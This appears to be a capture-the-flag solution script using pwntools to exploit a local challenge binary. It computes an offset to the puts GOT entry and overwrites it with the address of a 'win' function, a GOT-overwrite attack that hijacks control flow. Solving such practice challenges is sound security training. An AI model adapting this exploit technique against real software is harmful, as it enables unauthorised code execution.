from pwn import *

binary = context.binary = ELF('./chall_08')
p = process(binary.path)

puts_got = binary.got['puts']
target = binary.sym['target']   
win_func = binary.sym['win']   
puts_plt = binary.plt['puts']  

offset = (puts_got - target) // 8
payload = f"{puts_plt} {offset}"
p.sendline(payload)
p.sendline(p64(win_func))

p.interactive()
